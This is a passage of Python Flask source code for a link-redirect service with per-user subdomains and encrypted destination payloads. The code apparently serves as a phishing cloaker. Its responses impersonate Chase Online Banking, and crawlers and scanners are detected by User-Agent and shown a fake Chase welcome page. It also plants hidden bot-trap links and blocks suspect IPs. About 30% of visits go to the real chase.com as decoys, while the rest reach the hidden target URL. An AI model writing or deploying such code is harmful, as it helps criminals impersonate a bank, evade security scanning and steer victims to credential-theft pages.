                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Error</title>
                    <script src="https://cdn.tailwindcss.com"></script>
                </head>
                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
                        <p class="text-gray-600">Database unavailable. Unable to delete URL.</p>
                        <a href="/bot-trap" style="display:none;">Bot Trap</a>
                    </div>
                </body>
                </html>
            """), 500
    except Exception as e:
        logger.error(f"Error in delete_url: {str(e)}", exc_info=True)
        headers = mimic_chase_response()
        return Response(
            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
            status=500,
            headers=headers
        )

@app.route("/link", methods=["GET"], subdomain="<username>")
@rate_limit(limit=5, per=60)
def redirect_handler(username):
    try:
        base_domain = get_base_domain()
        logger.debug(f"Redirect handler called: username={username}, base_domain={base_domain}, "
                     f"query={request.query_string.decode()}, IP={request.remote_addr}, URL={request.url}")

        # Check if IP is blocked due to bot trap
        if valkey_client and valkey_client.exists(f"blocked:{request.remote_addr}"):
            logger.warning(f"Blocked IP {request.remote_addr} accessed redirect handler")
            headers = mimic_chase_response()
            return Response(
                "<html><head><title>Chase Online</title></head><body>Access Denied<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=403,
                headers=headers
            )

        # Scanner detection
        headers = mimic_chase_response()
        if 'User-Agent' in request.headers and any(keyword in request.headers['User-Agent'].lower() for keyword in ['bot', 'crawler', 'scanner', 'spider']):
            logger.debug("Detected scanner, returning Chase.com-like response")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Welcome to Chase Online Banking</body></html>",
                status=200,
                headers=headers
            )

        # Behavioral analysis
        if not check_behavior(request.remote_addr):
            logger.warning(f"Behavioral check failed for IP {request.remote_addr}")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Access Denied<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=403,
                headers=headers
            )

        # Parse query parameters
        url_id = request.args.get('id')
        timestamp = request.args.get('ts')
        encoded_payload = request.args.get('url')
        path_segment = request.path.lstrip('/')
        if not (url_id and timestamp and encoded_payload and path_segment):
            logger.error(f"Missing query parameters or path: id={url_id}, ts={timestamp}, url={encoded_payload}, path={path_segment}")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )

        # Extract randomstrings from path
        path_parts = path_segment.rsplit('/', 1)
        if len(path_parts) != 2 or path_parts[0] != 'link':
            logger.error(f"Invalid path format: {path_segment}, expected 'link/<randomstring1randomstring2>'")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )
        randomstrings = path_parts[1]
        if not randomstrings:
            logger.error(f"Empty randomstrings in path: {path_segment}")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )
        randomstring1 = randomstrings[:len(randomstrings)//2]
        randomstring2 = randomstrings[len(randomstrings)//2:]

        # Randomized delay (optimized for speed)
        delay = random.uniform(0.1, 0.2)
        time.sleep(delay)
        logger.debug(f"Applied random delay of {delay:.3f} seconds")

        # Decode payload
        try:
            encrypted_payload = base64.urlsafe_b64decode(encoded_payload).decode('utf-8')
            logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}... (length: {len(encrypted_payload)})")
        except Exception as e:
            logger.error(f"Error decoding base64 payload: {str(e)}")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid link encoding<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )

        # Generate url_id_hash
        url_id_hash = hashlib.sha256(f"{url_id}{encrypted_payload}".encode()).hexdigest()

        payload = None
        if valkey_client:
            try:
                cached_payload = valkey_client.get(f"url_payload:{url_id_hash}")
                if cached_payload:
                    payload = cached_payload
                    logger.debug(f"Using cached payload for URL ID: {url_id_hash}")
            except Exception as e:
                logger.error(f"Valkey error checking cached payload: {str(e)}")

        if not payload:
            if valkey_client:
                try:
                    url_data = valkey_client.hgetall(f"user:{username}:url:{url_id_hash}")
                    encryption_method = url_data.get('encryption_method', 'aes_gcm')
                    key_version = url_data.get('key_version', KEY_VERSION)
                except Exception as e:
                    logger.error(f"Valkey error retrieving encryption method: {str(e)}")
                    encryption_method = 'aes_gcm'
                    key_version = KEY_VERSION
            else:
                encryption_method = 'aes_gcm'
                key_version = KEY_VERSION

            methods = [encryption_method] if encryption_method else ['aes_gcm', 'hmac_sha256']
            key_pairs = [(AES_GCM_KEY, HMAC_KEY)]
            if key_version != KEY_VERSION and PREVIOUS_AES_GCM_KEY and PREVIOUS_HMAC_KEY:
                key_pairs.append((PREVIOUS_AES_GCM_KEY, PREVIOUS_HMAC_KEY))

            for method in methods:
                for aes_key, hmac_key in key_pairs:
                    try:
                        logger.debug(f"Trying decryption method: {method} with key version: {key_version}")
                        if method == 'aes_gcm':
                            payload = decrypt_aes_gcm(encrypted_payload, key=aes_key)
                        else:
                            payload = decrypt_hmac_sha256(encrypted_payload, key=hmac_key)
                        logger.debug(f"Decryption successful with {method}")
                        if valkey_client:
                            try:
                                expiry = json.loads(payload).get('expiry', int(time.time()) + 86400)
                                ttl = max(1, int(expiry - time.time()))
                                valkey_client.setex(f"url_payload:{url_id_hash}", ttl, payload)
                                logger.debug(f"Cached payload for URL ID: {url_id_hash} with TTL {ttl}s")
                            except Exception as e:
                                logger.error(f"Valkey error caching payload: {str(e)}")
                        break
                    except ValueError as e:
                        logger.debug(f"Decryption failed with {method} and key version {key_version}: {str(e)}")
                        continue
                if payload:
                    break

        if not payload:
            logger.error(f"All decryption methods failed for payload: {encrypted_payload[:50]}...")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid or corrupted link<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )

        try:
            data = json.loads(payload)
            redirect_url = data.get("student_link")
            expiry = data.get("expiry", float('inf'))
            if not redirect_url or not re.match(r"^https?://", redirect_url):
                logger.error(f"Invalid redirect URL: {redirect_url}")
                return Response(
                    "<html><head><title>Chase Online</title></head><body>Invalid destination URL<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                    status=400,
                    headers=headers
                )
            if time.time() > expiry:
                logger.warning("URL expired")
                if valkey_client:
                    valkey_client.delete(f"url_payload:{url_id_hash}")
                return Response(
                    "<html><head><title>Chase Online</title></head><body>Link expired<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                    status=410,
                    headers=headers
                )
            logger.debug(f"Parsed payload: redirect_url={redirect_url}")
        except Exception as e:
            logger.error(f"Payload parsing error: {str(e)}")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid link data<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )

        # Fake redirect for polymorphism
        if random.random() < 0.3:  # 30% chance
            logger.debug("Performing fake redirect to chase.com")
            return redirect("https://www.chase.com", code=302, Response=Response(headers=headers))

        final_url = redirect_url.rstrip('/')
        logger.info(f"Redirecting to {final_url}")
        if valkey_client:
            try:
                analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id_hash}", "analytics_enabled") == "1"
                if analytics_enabled:
                    valkey_client.hincrby(f"user:{username}:url:{url_id_hash}", "clicks", 1)
                    logger.debug(f"Incremented clicks for URL ID: {url_id_hash}")
            except Exception as e:
                logger.error(f"Valkey error logging click: {str(e)}")
        return redirect(final_url, code=302, Response=Response(headers=headers))
    except Exception as e:
        logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
        headers = mimic_chase_response()
        return Response(
            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
            status=500,
            headers=headers
        )

@app.route("/<endpoint>/<path:path_segment>", methods=["GET"], subdomain="<username>")
@rate_limit(limit=5, per=60)
def redirect_handler_old(username, endpoint, path_segment):
    try:
        base_domain = get_base_domain()
        logger.debug(f"Old redirect handler called: username={username}, base_domain={base_domain}, endpoint={endpoint}, "
                     f"path_segment={path_segment}, IP={request.remote_addr}, URL={request.url}")

        # Check if IP is blocked due to bot trap
        if valkey_client and valkey_client.exists(f"blocked:{request.remote_addr}"):
            logger.warning(f"Blocked IP {request.remote_addr} accessed old redirect handler")
            headers = mimic_chase_response()
            return Response(
                "<html><head><title>Chase Online</title></head><body>Access Denied<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=403,
                headers=headers
            )

        # Scanner detection
        headers = mimic_chase_response()
        if 'User-Agent' in request.headers and any(keyword in request.headers['User-Agent'].lower() for keyword in ['bot', 'crawler', 'scanner', 'spider']):
            logger.debug("Detected scanner, returning Chase.com-like response")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Welcome to Chase Online Banking</body></html>",
                status=200,
                headers=headers
            )

        # Behavioral analysis
        if not check_behavior(request.remote_addr):
            logger.warning(f"Behavioral check failed for IP {request.remote_addr}")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Access Denied<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=403,
                headers=headers
            )

        # Split path_segment to extract random_path and randomstrings
        path_parts = path_segment.rsplit('/', 1)
        if len(path_parts) != 2:
            logger.error(f"Invalid path_segment format: {path_segment}, expected <random_path>/<randomstring1randomstring2>")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )
        random_path, randomstrings = path_parts
        if not randomstrings:
            logger.error(f"Empty randomstrings in path_segment: {path_segment}")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid link format<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )
        randomstring1 = randomstrings[:len(randomstrings)//2]
        randomstring2 = randomstrings[len(randomstrings)//2:]

        # Randomized delay (optimized for speed)
        delay = random.uniform(0.1, 0.2)
        time.sleep(delay)
        logger.debug(f"Applied random delay of {delay:.3f} seconds")

        # Extract payload dynamically
        url_id = None
        encrypted_payload = None
        payload_length = 0
        if valkey_client:
            try:
                url_id = hashlib.sha256(f"{endpoint}{random_path}".encode()).hexdigest()
                url_data = valkey_client.hgetall(f"user:{username}:url:{url_id}")
                if url_data and 'encrypted_payload' in url_data:
                    encrypted_payload = url_data['encrypted_payload']
                    payload_length = len(encrypted_payload)
                    logger.debug(f"Retrieved encrypted_payload from Valkey: {encrypted_payload[:20]}... (length: {payload_length})")
                else:
                    logger.warning(f"No URL data found for url_id: {url_id}")
                    encrypted_payload = random_path
                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
            except Exception as e:
                logger.error(f"Valkey error retrieving URL data: {str(e)}")
                encrypted_payload = random_path
                url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()

        if not encrypted_payload:
            logger.error(f"No encrypted payload extracted from random_path: {random_path}")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid link<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )

        try:
            encrypted_payload = urllib.parse.unquote(encrypted_payload)
            logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}... (length: {len(encrypted_payload)})")
        except Exception as e:
            logger.error(f"Error decoding encrypted_payload: {str(e)}")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid link encoding<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )

        payload = None
        if valkey_client:
            try:
                cached_payload = valkey_client.get(f"url_payload:{url_id}")
                if cached_payload:
                    payload = cached_payload
                    logger.debug(f"Using cached payload for URL ID: {url_id}")
            except Exception as e:
                logger.error(f"Valkey error checking cached payload: {str(e)}")

        if not payload:
            if valkey_client:
                try:
                    url_data = valkey_client.hgetall(f"user:{username}:url:{url_id}")
                    encryption_method = url_data.get('encryption_method', 'aes_gcm')
                    key_version = url_data.get('key_version', KEY_VERSION)
                except Exception as e:
                    logger.error(f"Valkey error retrieving encryption method: {str(e)}")
                    encryption_method = 'aes_gcm'
                    key_version = KEY_VERSION
            else:
                encryption_method = 'aes_gcm'
                key_version = KEY_VERSION

            methods = [encryption_method] if encryption_method else ['aes_gcm', 'hmac_sha256']
            key_pairs = [(AES_GCM_KEY, HMAC_KEY)]
            if key_version != KEY_VERSION and PREVIOUS_AES_GCM_KEY and PREVIOUS_HMAC_KEY:
                key_pairs.append((PREVIOUS_AES_GCM_KEY, PREVIOUS_HMAC_KEY))

            for method in methods:
                for aes_key, hmac_key in key_pairs:
                    try:
                        logger.debug(f"Trying decryption method: {method} with key version: {key_version}")
                        if method == 'aes_gcm':
                            payload = decrypt_aes_gcm(encrypted_payload, key=aes_key)
                        else:
                            payload = decrypt_hmac_sha256(encrypted_payload, key=hmac_key)
                        logger.debug(f"Decryption successful with {method}")
                        if valkey_client:
                            try:
                                expiry = json.loads(payload).get('expiry', int(time.time()) + 86400)
                                ttl = max(1, int(expiry - time.time()))
                                valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
                                logger.debug(f"Cached payload for URL ID: {url_id} with TTL {ttl}s")
                            except Exception as e:
                                logger.error(f"Valkey error caching payload: {str(e)}")
                        break
                    except ValueError as e:
                        logger.debug(f"Decryption failed with {method} and key version {key_version}: {str(e)}")
                        # Fallback: Check if payload is unencrypted JSON
                        try:
                            json.loads(encrypted_payload)
                            logger.warning(f"Detected unencrypted payload: {encrypted_payload[:50]}...")
                            payload = encrypted_payload
                            break
                        except json.JSONDecodeError:
                            continue
                if payload:
                    break

        if not payload:
            logger.error(f"All decryption methods failed for payload: {encrypted_payload[:50]}...")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid or corrupted link<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )

        try:
            data = json.loads(payload)
            redirect_url = data.get("student_link")
            expiry = data.get("expiry", float('inf'))
            if not redirect_url or not re.match(r"^https?://", redirect_url):
                logger.error(f"Invalid redirect URL: {redirect_url}")
                return Response(
                    "<html><head><title>Chase Online</title></head><body>Invalid destination URL<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                    status=400,
                    headers=headers
                )
            if time.time() > expiry:
                logger.warning("URL expired")
                if valkey_client:
                    valkey_client.delete(f"url_payload:{url_id}")
                return Response(
                    "<html><head><title>Chase Online</title></head><body>Link expired<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                    status=410,
                    headers=headers
                )
            logger.debug(f"Parsed payload: redirect_url={redirect_url}")
        except Exception as e:
            logger.error(f"Payload parsing error: {str(e)}")
            return Response(
                "<html><head><title>Chase Online</title></head><body>Invalid link data<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
                status=400,
                headers=headers
            )

        # Fake redirect for polymorphism
        if random.random() < 0.3:  # 30% chance
            logger.debug("Performing fake redirect to chase.com")
            return redirect("https://www.chase.com", code=302, Response=Response(headers=headers))

        final_url = redirect_url.rstrip('/')
        logger.info(f"Redirecting to {final_url}")
        if valkey_client:
            try:
                analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
                if analytics_enabled:
                    valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
                    logger.debug(f"Incremented clicks for URL ID: {url_id}")
            except Exception as e:
                logger.error(f"Valkey error logging click: {str(e)}")
        return redirect(final_url, code=302, Response=Response(headers=headers))
    except Exception as e:
        logger.error(f"Error in redirect_handler_old: {str(e)}", exc_info=True)
        headers = mimic_chase_response()
        return Response(
            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
            status=500,
            headers=headers
        )

@app.route("/<endpoint>/<path:path_segment>", methods=["GET"])
@rate_limit(limit=5, per=60)
def redirect_handler_no_subdomain(endpoint, path_segment):
    try:
        host = request.host
        username = host.split('.')[0] if '.' in host else "default"
        logger.debug(f"Fallback redirect handler: username={username}, endpoint={endpoint}, "
                     f"path_segment={path_segment}, URL={request.url}")
        return redirect_handler_old(username, endpoint, path_segment)
    except Exception as e:
        logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}", exc_info=True)
        headers = mimic_chase_response()
        return Response(
            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
            status=500,
            headers=headers
        )

@app.route("/<path:path>", methods=["GET"])
def catch_all(path):
    logger.warning(f"404 Not Found for path: {path}, host: {request.host}, url: {request.url}")
    headers = mimic_chase_response()
    return Response(
        "<html><head><title>Chase Online</title></head><body>Page Not Found<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
        status=404,
        headers=headers
    )

if __name__ == "__main__":
    try:
        app.run(host="0.0.0.0", port=5000, debug=False)
    except Exception as e:
        logger.error(f"Error starting Flask app: {str(e)}", exc_info=True)
        import sys
        sys.exit(1)
